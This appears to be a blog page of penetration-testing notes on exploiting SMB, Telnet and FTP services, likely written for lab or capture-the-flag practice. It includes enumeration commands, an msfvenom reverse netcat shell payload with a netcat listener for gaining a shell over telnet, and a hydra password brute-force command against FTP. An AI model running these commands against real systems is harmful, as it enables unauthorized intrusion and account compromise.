<!DOCTYPE html>
<html lang="en">
<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

  

  <title>Services list cheatsheet</title>

  
  <meta name="author" content="pedrogg0">
  

  <meta name="description" content="List of common services and their usual exploitation">

  

  

  

  

  

  

  


  
    
      
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">


    
      
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">


    
  

  
    
      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
    
      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
    
  

  

  
  
  

  

  
  <meta property="og:site_name" content="Network services exploitation">
  <meta property="og:title" content="Services list cheatsheet">
  <meta property="og:description" content="List of common services and their usual exploitation">

  
  <meta property="og:image" content="http://localhost:4000/assets/img/back.jpg">
  

  
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://localhost:4000/">
  <link rel="canonical" href="http://localhost:4000/">
  

  
  <meta name="twitter:card" content="summary_large_image">
  
  <meta name="twitter:site" content="@">
  <meta name="twitter:creator" content="@">

  <meta property="twitter:title" content="Services list cheatsheet">
  <meta property="twitter:description" content="List of common services and their usual exploitation">

  
  <meta name="twitter:image" content="http://localhost:4000/assets/img/back.jpg">
  

  


  

  

</head>


<body>

  


  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Network services exploitation</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="main-navbar">
    <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="https://github.com/pedrogg0">Author's home</a>
          </li></ul>
  </div>

  

  
    <div class="avatar-container">
      <div class="avatar-img-border">
        <a href="http://localhost:4000/">
          <img alt="Navigation bar avatar" class="avatar-img" src="/assets/img/avatar-icon.png" />
        </a>
      </div>
    </div>
  

</nav>





  <!-- TODO this file has become a mess, refactor it -->






  <div id="header-big-imgs" data-num-img=1
    
    
    
      
      data-img-src-1="http://localhost:4000/assets/img/back.jpg"
    
    
    
  ></div>


<header class="header-section has-img">

<div class="big-img intro-header">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>Services list cheatsheet</h1>
          
            
              <h2 class="post-subheading">List of common services and their usual exploitation</h2>
            
          

          
            <span class="post-meta"> </span>
            
            
          
        </div>
      </div>
    </div>
  </div>
  <span class='img-desc'></span>
</div>

<div class="intro-header no-img">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>Services list cheatsheet</h1>
          
            
              <h2 class="post-subheading">List of common services and their usual exploitation</h2>
            
          

          
            <span class="post-meta"> </span>
            
            
          
        </div>
      </div>
    </div>
  </div>
</div>
</header>





<div class=" container-md ">
  <div class="row">
    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">

      

      

      <article role="main" class="blog-post">
        <style>
a.section {
    display: block;
    position: relative;
    top: -50px;
    visibility: hidden;
}
</style>

<blockquote>
  <p>Before everything: make a nmap scan for finding open and vulnerable ports.</p>
</blockquote>

<h1 id="table-of-contents">Table of contents</h1>

<ul>
  <li><a href="#SMB">SMB</a></li>
  <li><a href="#Telnet">TELNET</a></li>
  <li><a href="#FTP">FTP</a></li>
</ul>

<h1 id="smb-">SMB <a class="section" id="SMB"></a></h1>

<p>Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.</p>

<h4 id="enum4linux">Enum4linux</h4>

<p>It is a tool used to enumerate SMB shares. Makes it easy to quickly extract information from the target pertaining to SMB.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SYNTAX <span class="o">=</span> <span class="s2">"enum4linux [options] ip"</span>
    
OPTIONS:
 
 <span class="nt">-U</span>             get userlist
 <span class="nt">-M</span>             get machine list
 <span class="nt">-N</span>             get namelist dump <span class="o">(</span>different from <span class="nt">-U</span> and-M<span class="o">)</span>
 <span class="nt">-S</span>             get sharelist
 <span class="nt">-P</span>             get password policy information
 <span class="nt">-G</span>             get group and member list

 <span class="nt">-a</span>             all of the above <span class="o">(</span>full basic enumeration<span class="o">)</span>
</code></pre></div></div>

<h4 id="exploiting-smb">Exploiting SMB</h4>
<p>find vulnerabilities in <a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></p>

<h4 id="using-smbclient">Using SMBCLIENT</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SYNTAX: <span class="s2">"smbclient //[IP]/[SHARE]"</span>

Followed by: 

<span class="nt">-U</span> <span class="o">[</span>name] : to specify the user

<span class="nt">-p</span> <span class="o">[</span>port] : to specify the port

</code></pre></div></div>
<h1 id="telnet-">Telnet <a class="section" id="Telnet"></a></h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SYNTAX: <span class="s2">"telnet [ip][port]"</span>
</code></pre></div></div>

<h4 id="enumerating-telnet">Enumerating telnet</h4>

<p>check:
<a href="https://www.cvedetails.com">https://www.cvedetails.com</a> or
<a href="https://cve.mitre.org">https://cve.mitre.org</a>
for finding vulnerabilities.</p>

<p>Also, we can find an obvious misconfiguration that let us exploit it.</p>

<h4 id="connecting-telnet">Connecting Telnet</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SYNTAX: <span class="s2">"telnet [ip] [port]"</span>
</code></pre></div></div>

<p>In case we can`t see if we are executing what we type we can use <strong>tcpdump</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"sudo tcpdump ip proto </span><span class="se">\\</span><span class="s2">icmp -i tun0"</span> //tun0 <span class="o">=</span> network interface <span class="k">in </span>use
</code></pre></div></div>

<p>We need to preface the commands in the telnet machine terminal with “.RUN” 
ex:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">".RUN ping -c 1 [attackingMachine.localhost]"</span> //we can use that <span class="nb">command </span>to see that we are correctly executing code
</code></pre></div></div>

<h4 id="generating-a-reverse-shell-payload-using-msfvenom">Generating a reverse shell payload (using msfvenom)</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SYNTAX: <span class="s2">"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"</span>
</code></pre></div></div>
<p>Where:
-p = payload
lhost = our local host IP address (this is your machine IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format</p>

<p>Now we can use a netcat listener on our local machine:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"nc -lvp [listening port]"</span> 
</code></pre></div></div>

<p>We just need to copy and paste our msfvenom payload into the telnet session and run it as a command. Then we’ll be able to use a shell through the listener previously deployed.</p>

<h1 id="ftp-">FTP <a class="section" id="FTP"></a></h1>

<p>Standard FTP port = 21</p>

<h4 id="enumerating-ftp">Enumerating ftp</h4>

<p>We’re going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.</p>

<p>Alternative Enumeration Methods</p>

<p>It’s worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the “cwd” command for home directories which exist and those that don’t.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"ftp [IP]"</span>
</code></pre></div></div>

<h4 id="exploiting-ftp">Exploiting FTP</h4>

<p>If we have a possible username we can try to apply bruteforce using hydra.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"hydra -t 4 -l [USER] dale -P [PATH TO DICTIONARY] -vV [MACHINE IP] ftp"</span>
</code></pre></div></div>

<p>PATH TO DICTIONARY in my case is: /usr/share/wordlists/passwords/rock-you05.txt</p>


      </article>

      

      

      

      <ul class="pagination blog-pager">
        
        
      </ul>
      

    </div>
  </div>
</div>


  <footer>
  <div class="container-md beautiful-jekyll-footer">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
    <a href="mailto:pedrojosegarcia00@gmail.com" title="Email me">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Email me</span>
   </a>
  </li></ul>

      
      <p class="copyright text-muted">
      
        pedrogg0
        &nbsp;&bull;&nbsp;
      
      2022

      

      
      </p>
      <p class="theme-by text-muted">
        Powered by
        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
      </p>
      </div>
    </div>
  </div>
</footer>


  
  
    
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>


  
    
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>


  
    
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>


  



  
    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
    
      <script src="/assets/js/beautifuljekyll.js"></script>
    
  









</body>
</html>
